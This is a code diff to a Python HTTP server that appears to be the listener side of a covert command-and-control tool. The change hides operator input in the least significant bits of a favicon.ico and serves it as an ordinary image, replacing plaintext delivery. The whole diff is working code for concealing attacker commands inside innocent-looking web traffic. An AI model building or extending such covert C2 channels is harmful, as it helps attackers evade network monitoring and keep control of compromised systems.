@@ -13,6 +13,7 @@ from queue import Queue
 import time
 from Crypto.Cipher import AES
 from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, AES_KEY, AES_IV, RequestFlags
+from PIL import Image
 
 WEB_DIRECTORY = 'web' # Root directory of website files.
 
@@ -91,10 +92,17 @@ class RequestHandler(SimpleHTTPRequestHandler):
         '''
         Send a steganographic response containing user input
         '''
+        favicon_input = "web/images/favicon.ico"
+        encode_text_in_favicon(user_inputs.get(),favicon_input)
+        hidden_path = "secret_web/secret.ico"
+        with open(hidden_path, 'rb') as f:
+            ico_data = f.read()
         self.send_response(200)
+        self.send_header("Content-Type", "image/x-icon")
         self.end_headers()
         # Write user input to HTML file contents (TODO: use image steganography instead)
-        self.wfile.write(user_inputs.get().encode())
+        self.wfile.write(ico_data)
+        print("Sent!")
     
     def send_dummy_response(self):
         '''
@@ -132,8 +140,6 @@ class RequestHandler(SimpleHTTPRequestHandler):
         wait_for_user_input()
         self.send_user_input_response()
         
-
-
 class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
     pass
 
@@ -141,7 +147,48 @@ def run_http_server():
     server = ThreadingSimpleServer((LISTENER_IP, LISTENER_PORT), RequestHandler)
     server.serve_forever()
 
+def encode_text_in_favicon(input_text, input_path):
+    # Open the ICO file and extract the first frame
+    img = Image.open(input_path)
+    img = img.convert("RGB")  # Convert to RGB to ensure consistency
+    pixels = list(img.getdata())
+    
+    # Convert text to binary and append the end marker
+    binary_text = ''.join(format(ord(char), '08b') for char in input_text) + '1111111111111110'
+
+    # Pad binary text to make its length divisible by 3
+    padding_length = (3 - (len(binary_text) % 3)) % 3
+    binary_text += '0' * padding_length
+
+    if len(binary_text) > len(pixels) * 3:
+        raise ValueError("Text is too long to hide in this image.")
+    
+    # Encode text into pixel LSBs
+    new_pixels = []
+    binary_index = 0
+    for pixel in pixels:
+        r, g, b = pixel
+        if binary_index < len(binary_text):
+            r = (r & 0xFE) | int(binary_text[binary_index])
+            binary_index += 1
+        if binary_index < len(binary_text):
+            g = (g & 0xFE) | int(binary_text[binary_index])
+            binary_index += 1
+        if binary_index < len(binary_text):
+            b = (b & 0xFE) | int(binary_text[binary_index])
+            binary_index += 1
+        new_pixels.append((r, g, b))
+    
+    # Create a new image with the modified pixel data
+    new_img = Image.new("RGB", img.size)
+    new_img.putdata(new_pixels)
+    
+    # Save the image back in ICO format
+    new_img.save("secret_web/secret.ico", format="ICO")
+    print(f"Text successfully encoded")
+
 def main():
+    #favicon_input = "web/images/favicon.ico"
     # Run the http server in a background thread.
     server_thread = threading.Thread(target=run_http_server)
     server_thread.daemon = True # Ensures thread ends on main program exit.
